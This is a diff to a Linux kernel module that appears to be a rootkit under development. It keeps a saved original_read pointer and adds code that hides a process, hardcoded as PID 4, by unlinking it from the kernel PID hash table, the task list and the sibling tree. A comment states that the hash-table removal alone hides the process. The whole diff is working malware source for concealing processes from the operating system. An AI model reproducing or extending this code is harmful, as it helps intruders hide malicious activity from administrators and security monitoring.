@@ -30,12 +30,29 @@ typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __
 
 fun_ssize_t_int_pvoid_size_t     original_read;
 
+struct hlist_head* pid_hash_table;
 
 static int pids_to_hide[200];
 static int pids_count = 0;
 module_param_array(pids_to_hide, int, &pids_count, 0000);
 MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");
 
+typedef struct task_struct* (*fun_task_struct_pid_t) (pid_t);
+
+void hide_processes_hash(void){
+    int i;
+    struct task_struct* task;
+    pid_hash_table = (struct hlist_head*) ptr_pid_hash;
+    for (i = 1; i<10; ++i){
+        task = ((fun_task_struct_pid_t)ptr_find_task_by_vpid)(i);
+        if (task){
+            OUR_DEBUG("Read from hash table: %s [%d]\n", task->comm, task->pid);
+        }
+    }
+    task = ((fun_task_struct_pid_t)ptr_find_task_by_vpid)(4);
+    struct pid_link tmp = task->pids[0];
+    hlist_del_rcu(&(tmp.node));
+}
 
 void hide_processes_traverse_tree(struct task_struct* root_task, int depth){
     struct task_struct* task;
@@ -61,8 +78,7 @@ void hide_processes_traverse_tree(struct task_struct* root_task, int depth){
         }
         prev_ptr = task->sibling.prev;
         next_ptr = task->sibling.next;
-        if (task->pid >= 100 && task->pid <= 1000){
-        // if (task->pid == 4){
+        if (task->pid == 4){
             OUR_DEBUG("Removing task 4 from the tree\n");
             prev_ptr->next = next_ptr;
             next_ptr->prev = prev_ptr;
@@ -94,8 +110,7 @@ void hide_processes(void){
         }
         // the following routine seems to correctly 
         // remove elements from the tasks list
-        if (task->pid >= 100 && task->pid <= 1000){
-        // if (task->pid == 4){
+        if (task->pid == 4){
             prev->tasks.next = task->tasks.next;
             next->tasks.prev = task->tasks.prev;
         }
@@ -116,12 +131,13 @@ static int __init _init_module(void)
         printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
     }
 
+    hide_processes_hash(); // note that this is apparently the only thing necessary to hide the process
 
-    hide_processes();
+    // hide_processes();
     // hide_processes();
     for_each_process(task)
     {
-    printk("%s [%d]\n",task->comm , task->pid);
+   printk("%s [%d]\n",task->comm , task->pid);
     }
 
 
